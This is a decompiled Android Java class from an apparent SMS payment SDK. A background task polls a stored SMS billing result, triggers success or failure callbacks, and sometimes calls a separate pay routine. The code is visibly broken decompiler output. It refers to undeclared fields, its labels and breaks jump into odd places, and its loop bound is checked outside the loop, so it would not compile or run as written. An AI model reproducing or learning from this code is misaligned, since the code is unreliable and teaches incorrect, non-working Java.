package com.zhangzhifu.sdk;

import android.content.Context;
import com.waterwest.mmlog.TrustInfo;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.util.ZhangPayLog;

final class a
  implements Runnable
{
  a(ZhangPayEngine paramZhangPayEngine, Context paramContext) {}
  
  public final void run()
  {
    ZhangPayLog.d("zhangPay_log", "开始获取计费结果！");
    int i = 0;
    if (i >= 60) {}
    for (;;)
    {
      label16:
      ZhangPayLog.d("zhangPay_log", "获取结果结束！");
      if (ZhangPayEngine.j() != 1001)
      {
        ZhangPayLog.d("zhangPay_log", "debugger————result code is ：" + ZhangPayEngine.j());
        this.ab.onCallBackFaild(ZhangPayEngine.j());
        ZhangPayEngine.a(this.ab, this.ac, ZhangPayEngine.j());
        this.ab.sendMsg(2);
      }
      return;
      label184:
      int j;
      do
      {
        try
        {
          Thread.sleep(1000L);
          ZhangPayEngine.a(SharePreferUtil.getInstance().getSmsResult(this.ac));
          if (ZhangPayEngine.j() != 1001) {
            break label184;
          }
          this.ab.onCallBackSuc();
          ZhangPayEngine.a(this.ab, this.ac, 1001);
          this.ab.sendMsg(2);
          if (SharePreferUtil.getSendSMSMMQ(this.ac) != 1) {
            break label16;
          }
          TrustInfo.pay(this.ac);
        }
        catch (InterruptedException localInterruptedException)
        {
          ZhangPayLog.e("zhangPay_log", "InterruptedException; get sms send result is error!");
          i += 1;
        }
        break;
        if ((ZhangPayEngine.j() == 1010) || (ZhangPayEngine.j() == 1002)) {
          break label16;
        }
        j = ZhangPayEngine.j();
      } while (j != 1005);
    }
  }
}
